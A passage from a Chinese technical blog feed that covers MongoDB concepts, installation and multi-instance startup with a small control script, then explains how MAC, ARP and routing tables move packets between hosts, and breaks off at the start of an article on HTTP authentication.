<p>对于上面的三高要求来说很多关系型数据库就遇到了难以克服的问题，<strong>并且在WEB2.0的网站和应用来说关系型数据库很多主要特性却无用武之地</strong>！！！</p>
<p>1、数据库事务一致性需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">很多 web 实时系统并不要求严格的数据库事务,对读一致性的要求很低,有些场合对写一 致性要求也不高。因此数据库事务管理成了数据库高负载下一个沉重的负担。</span><br></pre></td></tr></table></figure>

<p>2、数据库的写实时性和读实时性需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对关系数据库来说,插入一条数据之后立刻查询,是肯定可以读出来这条数据的,但是对于 很多 web 应用来说,并不要求这么高的实时性。</span><br></pre></td></tr></table></figure>

<p>3、对复杂的 SQL 查询,特是多表关联查询的需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任何大数据量的 web 系统,都非常忌讳多个大表的关联查询,以及复杂的数据分析类型的复杂 SQL查询,特是SNS类型的网站,从需求以及产品设计角度,就避免了这种情况的产生。</span><br><span class="line">往往更多的只是单表的主键查询,以及单表的简单条件分页查询,SQL 的功能被 极大的弱化了。</span><br><span class="line">因此,关系数据库在这些越来越多的应用场景下显得不那么合适了</span><br></pre></td></tr></table></figure>

<p><strong>为了解决如上问题NoSQL就诞生了~</strong></p>
<h4 id="NoSQL特点"><a href="#NoSQL特点" class="headerlink" title="NoSQL特点"></a><strong>NoSQL特点</strong></h4><p>1、它可以处理超大量的数据<br>2、它运行在便宜的服务器集群上集群扩充起来非常方便并且成本很低。<br>3、它击碎了性能瓶颈<br>NoSQL 的支持者称,通过 NoSQL 架构可以省去将 Web 或 Java 应用和数据转换成 SQL 格式的 时间,执行速度变得更快。<br>“SQL 并非适用于所有的程序代码”,对于那些繁重的重复操作的数据,SQL 值得花钱。但 是当数据库结构非常简单时,SQL 可能没有太大用处。<br>4、它没有过多的操作<br>虽然NoSQL的支持者也承认关系型数据库提供了无可比拟的功能集合,而且在数据完整性上也发挥绝对稳定,他们同时也表示,企业的具体需求可能没有那么复杂。<br>5、 它的支持者源于社区<br>因为NoSQL项目都是开源的,因此它们缺乏供应商提供的正式支持。这一点它们与大多数 开源项目一样,不得不从社区中寻求支持。<br>NoSQL 发展至今,出现了好几种非关系性数据库,比如我正在学习的MongoDB</p>
<h2 id="初识MongoDB"><a href="#初识MongoDB" class="headerlink" title="初识MongoDB"></a>初识MongoDB</h2><p>MongoDB 是一个介于关系数据库和非关系数据库之间的产品,是非关系数据库当中功能最丰富,最像关系数据库的。<br>他支持的数据结构非常松散,是类似 json 的 bjson 格式,因此可以存储比较复杂的数据类型。<br>MongoDB最大的特点：它支持的查询语言非常强大,<strong>其语法有点类似于面向对象的查询语言</strong>,<strong>几乎可以实现类似关系数据库单表查询的绝大部分功能</strong>, 而且还支持对数据建立索引。它是一个面向集合的,模式自由的文档型数据库。</p>
<p><strong>1、 面向集合(Collenction-Orented)</strong><br>意思是数据被分组存储在数据集中, 被称为一个集合(Collenction)。每个集合在数据库中 都有一个唯一的标识名,并且可以包 无限数目的文档。集合的概念类似关系型数据库(RDBMS)里的表(table),不同的是它不需要定义任何模式(schema)。</p>
<p><strong>2、 模式自由(schema-free)</strong><br>意味着对于存储在 MongoDB 数据库中的文件,我们不需要知道它的任何结构定义。提了这 么多次”无模式”或”模式自由”,它到是个什么概念呢?例如,下面两个记录可以存在于同一个集合里面:<br>{“welcome” : “Beijing”}<br>{“age” : 28}</p>
<p><strong>3、 文档型 意思是我们存储的数据是键-值对的集合,键是字符串,值可以是数据类型集合里的任意类型,</strong></p>
<p>包括数组和文档. 我们把这个数据格式称作 “BSON” 即 “Binary Serialized dOcument Notation.”</p>
<h4 id="MongoDB特点"><a href="#MongoDB特点" class="headerlink" title="MongoDB特点"></a><strong>MongoDB特点</strong></h4><ol>
<li>面向集合存储,易于存储对象类型的数据</li>
<li>模式自由</li>
<li>支持动态查询</li>
<li>支持完全索引,包 内部对象</li>
<li>支持查询</li>
<li>支持复制和故障恢复</li>
<li>使用高效的二进制数据存储,包括大型对象(如视频等)</li>
<li>自动处理碎片,以支持云计算层次的扩展性</li>
<li>支持 Python,PHP,Ruby,Java,C,C#,Javascript,Perl更多请看社区</li>
<li>文件存储格式为 BSON(一种 JSON 的扩展)</li>
<li>可通过网络访问</li>
</ol>
<h4 id="MongoDB功能"><a href="#MongoDB功能" class="headerlink" title="MongoDB功能"></a><strong>MongoDB功能</strong></h4><ol>
<li>面向集合的存储:适合存储对象及 JSON 形式的数据</li>
<li>动态查询:MongoDB 支持丰富的查询表达式。查询指令使用 JSON 形式的标记,可轻易查询文档中内嵌的对象及数组</li>
<li>完整的索引支持:包括文档内嵌对象及数组。MongoDB 的查询优化器会分析查询表达式,并生成一个高效的查询计划</li>
<li>查询监视:MongoDB 包 一系列监视工具用于分析数据库操作的性能</li>
<li>复制及自动故障转移:MongoDB 数据库支持服务器之间的数据复制,支持主-从模式及</li>
<li>服务器之间的相互复制。复制的主要目标是提供冗余及自动故障转移</li>
<li>高效的传统存储方式:支持二进制数据及大型对象(如照片或图片)</li>
<li>自动分片以支持云级 的伸缩性:自动分片功能支持水平的数据库集群,可动态添加额外的机器</li>
</ol>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h4><ol>
<li>网站数据:MongoDB 非常适合实时的插入,更新与查询,并具备网站实时数据存储所需的复制及高度伸缩性</li>
<li>缓存:由于性能很高,MongoDB 也适合作为信息基础设施的缓存层。在系统重启之后, 由 MongoDB 搭建的持久化缓存层可以避免下层的数据源过载</li>
<li>大尺寸,低价值的数据:使用传统的关系型数据库存储一些数据时可能会比较昂贵,在此之前,很多时候程序员往往会选择传统的文件进行存储</li>
<li>高伸缩性的场景:MongoDB 非常适合由数十或数百台服务器组成的数据库。MongoDB的路线图中已经包 对 MapReduce 引擎的内置支持</li>
<li>用于对象及 JSON 数据的存储:MongoDB 的 BSON 数据格式非常适合文档化格式的存储及查询</li>
</ol>
<h2 id="MongoDB部署与维护"><a href="#MongoDB部署与维护" class="headerlink" title="MongoDB部署与维护"></a>MongoDB部署与维护</h2><h4 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a><strong>安装MongoDB</strong></h4><p>MongoDB维护者还事相当的人性化的给我们提供了YUM源安装就相当的方便了，当然也可以通过源码去安装！</p>
<p><strong>1、创建一个/etc/yum.repos.d/mongodb-enterprise.repo配置文件</strong></p>
<p><strong>内容如下</strong></p>
<p><strong>3.2版本</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mongodb-enterprise]</span><br><span class="line">name=MongoDB Enterprise Repository</span><br><span class="line">baseurl=https://repo.mongodb.com/yum/redhat/$releasever/mongodb-enterprise/stable/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://www.mongodb.org/static/pgp/server-3.2.asc</span><br></pre></td></tr></table></figure>

<p><strong>2.6版本</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mongodb-org-2.6]</span><br><span class="line">name=MongoDB 2.6 Repository</span><br><span class="line">baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<p><strong>2、执行安装命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y mongodb-enterprise</span><br></pre></td></tr></table></figure>

<p>如果你想安装特殊的指定版本可以按照如下命令操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y mongodb-enterprise-3.2.1 mongodb-enterprise-server-3.2.1 mongodb-enterprise-shell-3.2.1 mongodb-enterprise-mongos-3.2.1 mongodb-enterprise-tools-3.2.1</span><br></pre></td></tr></table></figure>

<h4 id="卸载MongoDB"><a href="#卸载MongoDB" class="headerlink" title="卸载MongoDB"></a><strong>卸载MongoDB</strong></h4><p>停止服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service mongod stop</span><br></pre></td></tr></table></figure>

<p>删除包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum erase $(rpm -qa | grep mongodb-enterprise)</span><br></pre></td></tr></table></figure>

<p>删除库文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm -r /var/<span class="built_in">log</span>/mongodb</span><br><span class="line">sudo rm -r /var/lib/mongo</span><br></pre></td></tr></table></figure>

<h4 id="源码安装MongoDB"><a href="#源码安装MongoDB" class="headerlink" title="源码安装MongoDB"></a><strong>源码安装MongoDB</strong></h4><p>通过MongoDB官网就可以打开下载地址：<a href="https://www.mongodb.com/download-center?jmp=nav&amp;_ga=1.114046535.1911966133.1464573239#community" target="_blank" rel="noopener">https://www.mongodb.com/download-center?jmp=nav&amp;_ga=1.114046535.1911966133.1464573239#community</a> 从里面获取到下载地址之后直接在服务器上下载即可！</p>
<p><strong>1、下载源码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel62-3.2.6.tgz</span><br></pre></td></tr></table></figure>

<p><strong>2、解压</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf mongodb-linux-x86_64-rhel62-3.2.6.tgz</span><br></pre></td></tr></table></figure>

<p>解压后的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GNU-AGPL-3.0  <span class="comment">#GNU协议文件</span></span><br><span class="line">MPL-2  <span class="comment">#MPL协议文件</span></span><br><span class="line">README <span class="comment">#README软件提供类似于软件须知</span></span><br><span class="line">THIRD-PARTY-NOTICES  <span class="comment">#第三方的提文件</span></span><br><span class="line">bin <span class="comment">#主程序目录</span></span><br></pre></td></tr></table></figure>

<p>上面的几个文件，没有具体的实际作用我们可以删除掉！但是README还是建议保留下的</p>
<p>并且为了方便管理我把的目录名更改为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv mongodb-linux-x86_64-rhel62-3.2.6 mongodb</span><br></pre></td></tr></table></figure>

<p><strong>3、启动Mongodb</strong></p>
<p>进入到bin目录下，执行./mongod 看看提示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2016-05-30T10:36:33.520+0800 I STORAGE  [initandlisten] exception in initAndListen: 29 Data directory /data/db not found., terminating</span><br></pre></td></tr></table></figure>

<p>所以在MongoDB在启动的时候默认指定的数据库目录是/data/db我们可以通过 –dbpath=目录名称 来指定数据库默认存储的路径</p>
<p>我们来创建别名和目录指定并启动它</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath=/work/app/mongodb/data/</span><br></pre></td></tr></table></figure>

<p>现在启动的时候是在前台启动的，如果当前终端退出后那么程序就会退出，怎么让他在后台启动呢？ –fork –logpath=日志文件和路径，在使用fork参数的时候必须指定日志文件路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath=/work/app/mongodb/data/ --fork      </span><br><span class="line">BadValue: --fork has to be used with --logpath or --syslog</span><br><span class="line">try './mongod --help' for more information</span><br></pre></td></tr></table></figure>

<p><strong>所以后台启动为</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath=/work/app/mongodb/data/ --fork --logpath=/work/app/mongodb/data/mongodb1.log</span><br><span class="line">about to fork child process, waiting until server is ready for connections.</span><br><span class="line">forked process: 16975</span><br><span class="line">child process started successfully, parent exiting</span><br></pre></td></tr></table></figure>

<p><strong>关闭程序，在关闭的时候必须执行dbpath</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath=/work/app/mongodb/data/ --shutdown</span><br></pre></td></tr></table></figure>

<p><strong>4、改为配置文件启动方式</strong></p>
<p>现在我们可以在后台启动了，但是有个问题，我们以后再配置管理的时候，难道每次都要去手动去设置这些参数呢？如果参数错误了造成的问题呢？</p>
<p>4.1、单实例如何通过配置文件启动</p>
<p>首先创建一个目录config目录名称随意,然后在目录里创建一个配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim mongodb1.cnf</span><br></pre></td></tr></table></figure>

<p>然后在配置文件里写入参数，把咱们平时写的参数写到配置文件中</p>
<p>参考命令行下的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath=/work/app/mongodb/data/ --fork --logpath=/work/app/mongodb/data/mongodb1.log</span><br></pre></td></tr></table></figure>

<p>配置文件内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim mongodb1.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> have a parameter must be write like :  key=value</span></span><br><span class="line">dbpath=/work/app/mongodb/data/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> not paramenter and you want <span class="built_in">enable</span> must be write like : fork=<span class="literal">true</span></span></span><br><span class="line">fork=true</span><br><span class="line">port=27017</span><br><span class="line">logpath=/work/app/mongodb/data/mongodb1.log</span><br></pre></td></tr></table></figure>

<p>启动命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/mongod -f config/mongodb1.cnf </span><br><span class="line">about to fork child process, waiting until server is ready for connections.</span><br><span class="line">forked process: 17220</span><br><span class="line">child process started successfully, parent exiting</span><br></pre></td></tr></table></figure>

<p>关闭命令：  因为配置文件中已经有数据库的路径了，所以直接通过–shutdown就可以了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/mongod -f config/mongodb1.cnf --shutdown</span><br><span class="line">2016-05-30T12:10:12.295+0800 I CONTROL  [main] log file "/work/app/mongodb/data/mongodb1.log" exists; moved to "/work/app/mongodb/data/mongodb1.log.2016-05-30T04-10-12".</span><br><span class="line">killing process with pid: 17220</span><br></pre></td></tr></table></figure>

<p><strong>5、在服务器上通过配置文件启动多实例</strong></p>
<p>首先创建第二个实例的数据库存储目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /work/app/mongodb/data2</span><br></pre></td></tr></table></figure>

<p>再添加配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /work/app/mongodb/config</span><br><span class="line">vim mongodb2.cnf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> have a parameter must be write like :  key=value</span></span><br><span class="line">dbpath=/work/app/mongodb/data2/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> not paramenter and you want <span class="built_in">enable</span> must be write like : fork=<span class="literal">true</span></span></span><br><span class="line">fork=true</span><br><span class="line">port=27018</span><br><span class="line">logpath=/work/app/mongodb/data/mongodb2.log</span><br></pre></td></tr></table></figure>

<p>启动实例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一个实例</span></span><br><span class="line">bin/mongod -f config/mongodb1.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">第二个实例</span></span><br><span class="line">bin/mongod -f config/mongodb2.cnf</span><br><span class="line">'''</span><br><span class="line">以后如果还有其他实例按照上面的操作即可</span><br><span class="line">'''</span><br></pre></td></tr></table></figure>

<p>查看结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef |grep -i mong</span><br><span class="line">root     17737     1  3 15:22 ?        00:00:00 bin/mongod -f config/mongodb1.cnf</span><br><span class="line">root     17758     1  2 15:22 ?        00:00:00 bin/mongod -f config/mongodb2.cnf</span><br></pre></td></tr></table></figure>

<h2 id="MongoDB-Server脚本"><a href="#MongoDB-Server脚本" class="headerlink" title="MongoDB Server脚本"></a><strong>MongoDB Server脚本</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">---------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Written by     : sun</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Program        : mongodb_server.sh will <span class="built_in">help</span> to contrl :start stop restart mongodb</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Creation Date  : 2016/5/30</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Last Modified  : 2016/5/30</span></span><br><span class="line"><span class="meta">#</span><span class="bash">---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">instance=$1</span><br><span class="line">action=$2</span><br><span class="line"></span><br><span class="line">case "$action" in</span><br><span class="line">    start)</span><br><span class="line">            /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf</span><br><span class="line">            ;;</span><br><span class="line">    'stop')</span><br><span class="line">            /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf --shutdown</span><br><span class="line">            ;;</span><br><span class="line">    'restart')</span><br><span class="line">            /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf --shutdown</span><br><span class="line">            /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf</span><br><span class="line">            ;;</span><br><span class="line">    *)</span><br><span class="line">            echo -e "\033[31;40myou must input like : ./mongodb_server.sh mongodbname for example :  ./mongodb_server.sh mongodb1\033[0m"</span><br><span class="line">            ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>网络传输中的表和包的流经过程</title>
    <url>/articles/93a903d8.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了网络传输过程中3张表：MAC地址表，ARP缓存表和路由表。并且也介绍了数据包在网络传输中从源到目的主机的过程。</p>
<a id="more"></a>

<h2 id="表详解"><a href="#表详解" class="headerlink" title="表详解"></a>表详解</h2><h4 id="MAC地址表详解"><a href="#MAC地址表详解" class="headerlink" title="MAC地址表详解"></a>MAC地址表详解</h4><p>说到MAC地址表，就不得不说一下交换机的工作原理了，因为交换机是根据MAC地址表转发数据帧的。在交换机中有一张记录着局域网主机MAC地址与交换机接口的对应关系的表，交换机就是根据这张表负责将数据帧传输到指定的主机上的。</p>
<p><strong>交换机的工作原理</strong></p>
<p>交换机在接收到数据帧以后，首先、会记录数据帧中的源MAC地址和对应的接口到MAC表中，接着、会检查自己的MAC表中是否有数据帧中目标MAC地址的信息，如果有则会根据MAC表中记录的对应接口将数据帧发送出去(也就是单播)，如果没有，则会将该数据帧从非接受接口发送出去(也就是广播)。</p>
<p>如下图：详细讲解交换机传输数据帧的过程</p>
<p>　　<img src="/articles/93a903d8/1.png" alt="img"></p>
<p>1)主机A会将一个源MAC地址为自己，目标MAC地址为主机B的数据帧发送给交换机。</p>
<p>2)交换机收到此数据帧后，首先将数据帧中的源MAC地址和对应的接口(接口为f 0/1) 记录到MAC地址表中。</p>
<p>3)然后交换机会检查自己的MAC地址表中是否有数据帧中的目标MAC地址的信息，如果有，则从MAC地址表中记录的接口发送出去，如果没有，则会将此数据帧从非接收接口的所有接口发送出去(也就是除了f 0/1接口)。</p>
<p>4)这时，局域网的所有主机都会收到此数据帧，但是只有主机B收到此数据帧时会响应这个广播，并回应一个数据帧，此数据帧中包括主机B的MAC地址。</p>
<p>5)当交换机收到主机B回应的数据帧后，也会记录数据帧中的源MAC地址(也就是主机B的MAC地址)，这时，再当主机A和主机B通信时，交换机根据MAC地址表中的记录，实现单播了。</p>
<p>如下图：当局域网存在多个交换机互联的时候，交换机的MAC地址表是怎么记录的呢？</p>
<p>　　<img src="/articles/93a903d8/2.png" alt=" 点击查看大图"></p>
<p>1)主机A将一个源MAC地址为自己，目标MAC地址主机C的数据帧发送给交换机</p>
<p>2)交换机1收到此数据帧后，会学习源MAC地址，并检查MAC地址表，发现没有目标MAC地址的记录，则会将数据帧广播出去，主机B和交换机2都会收到此数据帧。</p>
<p>3)交换机2收到此数据帧后也会将数据帧中的源MAC地址和对应的接口记录到MAC地址表中，并检查自己的MAC地址表，发现没有目标MAC地址的记录，则会广播此数据帧。</p>
<p>4)主机C收到数据帧后，会响应这个数据帧，并回复一个源MAC地址为自己的数据帧，这时交换机1和交换机1都会将主机C的MAC地址记录到自己的MAC地址表中，并且以单播的形式将此数据帧发送给主机A。</p>
<p>5)这时，主机A和主机C通信就是一单播的形式传输数据帧了，主机B和主机C通信如上述过程一样，因此交换机2的MAC地址表中记录着主机A和主机B的MAC地址都对应接口f 0/1。</p>
<p><strong>总结</strong>：</p>
<p>从上面的两幅图可以看出，交换机具有动态学习源MAC地址的功能，并且交换机的一个接口可以对应多个MAC地址，但是一个MAC地址只能对应一个接口。</p>
<p>注意：交换机动态学习的MAC地址默认只有300S的有效期，如果300S内记录的MAC地址没有通信，则会删除此记录。</p>
<hr>
<h4 id="ARP缓存表详解"><a href="#ARP缓存表详解" class="headerlink" title="ARP缓存表详解"></a>ARP缓存表详解</h4><p>上面我们讲解了交换机的工作原理，知道交换机是通过MAC地址通信的，但是我们是如何获得目标主机的MAC地址呢？这时我们就需要使用ARP协议了，在每台主机中都有一张ARP表，它记录着主机的IP地址和MAC地址的对应关系。</p>
<p>ARP协议：ARP协议是工作在网络层的协议，它负责将IP地址解析为MAC地址。</p>
<p>如下图：详细讲解ARP的工作原理。</p>
<p>　　<img src="/articles/93a903d8/3.png" alt="img"></p>
<p>1)如果主机A想发送数据给主机B，主机A首先会检查自己的ARP缓存表，查看是否有主机B的IP地址和MAC地址的对应关系，如果有，则会将主机B的MAC地址作为源MAC地址封装到数据帧中。如果没有，主机A则会发送一个ARP请求信息，请求的目标IP地址是主机B的IP地址，目标MAC地址是MAC地址的广播帧(即FF-FF-FF-FF-FF-FF)，源IP地址和MAC地址是主机A的IP地址和MAC地址。</p>
<p>2)当交换机接受到此数据帧之后，发现此数据帧是广播帧，因此，会将此数据帧从非接收的所有接口发送出去。</p>
<p>3）当主机B接受到此数据帧后，会校对IP地址是否是自己的，并将主机A的IP地址和MAC地址的对应关系记录到自己的ARP缓存表中，同时会发送一个ARP应答，其中包括自己的MAC地址。</p>
<p>4)主机A在收到这个回应的数据帧之后，在自己的ARP缓存表中记录主机B的IP地址和MAC地址的对应关系。而此时交换机已经学习到了主机A和主机B的MAC地址了。</p>
<hr>
<h4 id="路由表详解"><a href="#路由表详解" class="headerlink" title="路由表详解"></a>路由表详解</h4><p>路由器负责不同网络之间的通信，它是当今网络中的重要设备，可以说没有路由器就没有当今的互联网。在路由器中也有一张表，这张表叫路由表，记录着到不同网段的信息。路由表中的信息分为直连路由和非直连路由。</p>
<p>直连路由：是直接连接在路由器接口的网段，由路由器自动生成。</p>
<p>非直连路由：就是不是直接连接在路由器接口上的网段，此记录需要手动添加或者是使用动态路由。</p>
<p>路由表中记录的条目有的需要手动添加(称为静态路由)，有的测试动态获取的(称为动态路由)。直连路由属于静态路由。</p>
<p>路由器是工作在网络层的，在网络层可以识别逻辑地址。当路由器的某个接口收到一个包时，路由器会读取包中相应的目标的逻辑地址的网络部分，然后在路由表中进行查找。如果在路由表中找到目标地址的路由条目，则把包转发到路由器的相应接口，如果在路由表中没有找到目标地址的路由条目，那么，如果路由配置默认路由，就科举默认路由的配置转发到路由器的相应接口；如果没有配置默认路由，则将该包丢弃，并返回不可到达的信息。这就是数据路由的过程。</p>
<p>　　如下图：详细介绍路由器的工作原理</p>
<p>　　<img src="/articles/93a903d8/4.png" alt=" 点击查看大图"></p>
<p>1)HostA在网络层将来自上层的报文封装成IP数据包，其中源IP地址为自己，目标IP地址是HostB，HostA会用本机配置的24位子网掩码与目标地址进行“与”运算，得出目标地址与本机不是同一网段，因此发送HostB的数据包需要经过网关路由A的转发。</p>
<p>2)HostA通过ARP请求获取网关路由A的E0口的MAC地址，并在链路层将路由器E0接口的MAC地址封装成目标MAC地址，源MAC地址是自己。</p>
<p>3)路由器A从E0可接收到数据帧，把数据链路层的封装去掉，并检查路由表中是否有目标IP地址网段(即192.168.2.2的网段)相匹配的的项，根据路由表中记录到192.168.2.0网段的数据请发送给下一跳地址10.1.1.2，因此数据在路由器A的E1口重新封装，此时，源MAC地址是路由器A的E1接口的MAC地址，封装的目标MAC地址则是路由器2的E1接口的MAC地址。</p>
<p>4)路由B从E1口接收到数据帧，同样会把数据链路层的封装去掉，对目标IP地址进行检测，并与路由表进行匹配，此时发现目标地址的网段正好是自己E0口的直连网段，路由器B通过ARP广播，获知HostB的MAC地址，此时数据包在路由器B的E0接口再次封装，源MAC地址是路由器B的E0接口的MAC地址，目标MAC地址是HostB的MAC地址。封装完成后直接从路由器的E0接口发送给HostB。</p>
<p>5)此时HostB才会收到来自HostA发送的数据。</p>
<p><strong>总结</strong>：</p>
<p>路由表负责记录一个网络到另一个网络的路径，因此路由器是根据路由表工作的。</p>
<p>看完上面的文章是不是感觉原来数据在网络中传输是这么的复杂啊！呵呵…其实这些过程都是计算机自己完成的，我们需要做的很少。</p>
<h2 id="包传输"><a href="#包传输" class="headerlink" title="包传输"></a>包传输</h2><p><img src="/articles/93a903d8/5.jpg" alt></p>
<p> 为了便于理解，先从同一广播域内两台主机通信开始叙述吧。只要能理解这些，那也就差不多可以理解跨路由传输过程了（两者不同之处在于源和目标MAC地址的转换）。</p>
<h4 id="情景一：同一广播域内，两台主机通信过程"><a href="#情景一：同一广播域内，两台主机通信过程" class="headerlink" title="情景一：同一广播域内，两台主机通信过程"></a>情景一：同一广播域内，两台主机通信过程</h4><p>我们知道两主机要通信传送数据时，就要把应用数据封装成IP包（因为我们的网络大多都是TCP/IP的以太网了），然后再交给下一层数据链路层继续封装成帧；之后根据MAC地址才能把数据从一台主机，准确无误的传送到另一台主机。</p>
<p>如图：当NO要和N1通信时，假如N0知道N1的IP但却不知道它的MAC地址，那NO就会发送一个ARP的广播请求（里面源IP是NO 目标IP是N1  源MAC是N0  目标MAC是12个F）给同一广播域中的所有成员，当交换机SW0从自己的1接口上收到这个广播包，然后它会读取这个帧的源MAC地址和目标MAC地址，由于交换机SW0刚启动加电时，它的MAC表为空的。所以它会把NO的MAC地址与之相对应的接口1放到一张表里，这张表就是MAC地址表。然后他再从别的接口广播这个数据帧，当别的主机收到这个广播时，查看目标IP不是自己的，就会丢弃此包。如果N1接收到这个数据帧，它检查目标IP和这个的IP是一样的，就会回应这个ARP请求，把自己的IP和MAC封装成源IP和源MAC，N0的IP和N0的MAC地址为目标IP与目标MAC，并记录NO的MAC与IP，放进自己的ARP缓存表中。此时，这个应答包经过交换机SWO时，它又会检查源MAC 、 目标MAC，把N1的MAC和自己接口2放进MAC地址表中，再查看自己的MAC地址表，发现存在目标MAC与自己的1接口对应（由于刚开始有记录过N0的MAC），那它就会直接把这个应答包从接口1送出去了。主机N0收到这个包后发现目标MAC是自己，就会处理这个包。并把N1的MAC与IP放进自己的ARP缓存表中。这时主机N0就知道N1的MAC地址了，以后要发送数据，就直接把N1的IP与MAC封装进帧中进行点对点的发送了。</p>
<h4 id="情景二：跨路由的数据传输过程"><a href="#情景二：跨路由的数据传输过程" class="headerlink" title="情景二：跨路由的数据传输过程"></a>情景二：跨路由的数据传输过程</h4><p> 当NO要和N2通信时，此时NO会检查N2的IP地址跟自己是否处在同一网段，图上得知，两主机肯定不会是同一网段的。因为N2和自己处在不同网段，所以，N0会把数据包发给它的网关，也就是R0上的F0/0接口了。源IP和源MAC地址是N0自己的，目标IP是N2的，目标MAC是R0上接口F0/0的（如果N0不知道F0/0的MAC,就会跟情景一相似，发个ARP广播来得到F0/0的MAC地址）。当这个数据包到达R0时，路由器R0会查看目标IP的是否是自己，由于目标不是自己，所以，会查看自己的路由表，找出到达N2网段的路由；如果没有相关条目，就直接丢弃。当查看路由表后发现到达N2网段的出接口是F0/1。于是，把数据包转到F0/1接口上，再由接口F0/1传给R1。这个过程，数据包的源IP是N0 源MAC是F0/1 目标IP是N2 目标MAC是R1的F0/1接口IP 。</p>
<p>当R1收到这个数据包后，同样也要检查包的目标IP是否是自己，它会主动查找自己的路由表，发现目标IP跟自己F0/0接口处在同一网段，于是就把包传到F0/0接口上去发给N2 （假如R1上的ARP缓存表中没有N2的MAC，则接口F0/0会发送一个ARP广播给跟它相连的广播域中；这个ARP广播包的源IP是接口F0/0的IP 源MAC也是F0/0的MAC  目标IP是N2 目标MAC为12个F）,假如N2的MAC地址已经在R1的ARP缓存中了，那就会直接把数据包封装成：源IP为N0 源MAC为R1的F0/0 目标IP为N2 目标MAC为N2了。</p>
<p>到了这里，包的跨路由传输就会结束了，当包到达N2，做反向操作即可把包发给N0了。</p>
<p><strong>总结</strong>：</p>
<p>同一广播域中，包的源、目标IP;源、目标MAC是真实的两台主机上的IP与MAC地址。</p>
<p>跨路由中，包的源IP与目标IP始终不会发生变化，源和目标MAC根据所经过的路由接口不同而发生相应变化。</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Http认证</title>
    <url>/articles/e4025678.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详解介绍了http的认证。认证分为：单向认证和双向认证。</p>
<a id="more"></a>

<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。</p>
<p>使用TCP端口为：80</p>
